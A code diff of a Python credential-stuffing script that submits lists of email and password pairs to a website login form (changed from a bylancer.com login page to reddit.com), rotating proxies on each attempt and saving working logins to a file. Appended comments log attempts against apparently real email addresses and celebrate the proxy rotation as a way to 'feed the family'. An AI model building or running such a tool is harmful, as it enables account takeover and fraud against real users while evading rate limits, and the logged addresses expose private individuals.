@@ -32,25 +32,28 @@ def combine():
 
 
 def fucking_crack():
-    url = 'http://www.bylancer.com/product/quickadphp/login.php'
+    url = 'http://reddit.com'
     headers = { "Content-Type" : "application/x-www-form-urlencoded", "Content-Language" : "en-US"   } #generate random user-agent per user
-    currentproxy = currProxy = proxies[random.randint(0, len(proxies) - 1)]
+    currentproxy = ""
     for d, e in zip(emails, parsed_passwords):
+        currproxy = switch_proxy(currentproxy)
         payload = {'username': d,
                         'password': e,
                         'ref': 'dashboard.php',
                         'submit': ': undefined'}
-
-            # socket.setdefaulttimeout(timeout)
-        proxy = urllib2.ProxyHandler({'http': currentproxy})
+        proxy = urllib2.ProxyHandler({'http': currproxy})
         opener = urllib2.build_opener(proxy)
         data = urllib.urlencode(payload)
         req = urllib2.Request(url, data, headers)
         response = opener.open(req)
         accountstatus = response.read()
         valid(accountstatus, d, e)
+        print currproxy
 
-
+def switch_proxy(currentproxy):
+    currentproxy = proxies[random.randint(0, len(proxies)-1)]
+    return currentproxy
+        
 def valid(a,b,c):
         if '<h1>Sign In</h1>' not in a:
             f = open(success, 'w')
@@ -88,3 +91,18 @@ combine()
 fucking_crack()
 # data gets parsed and sorted
 # next start cracking!!!!!
+
+# [-][-] invalid account...
+#192.168.1.131:8080
+#[-][-]schoeberlein@freenet.de invalid account...
+#192.168.1.131:8080
+#[-][-]robitobbi@gmx.net invalid account...
+#192.168.1.131:8080
+#[-][-]stephanielouise17@gmail.com invalid account...
+##c[-][-]dolphingirllollolrofl@gmail.com invalid account...
+#192.168.1.131:8080
+
+
+#IT USES PROXY, NOW WE JUST ADD A METHOD TO ROTATE THE PROXIES!!! FEED THE FAMILY
+
+
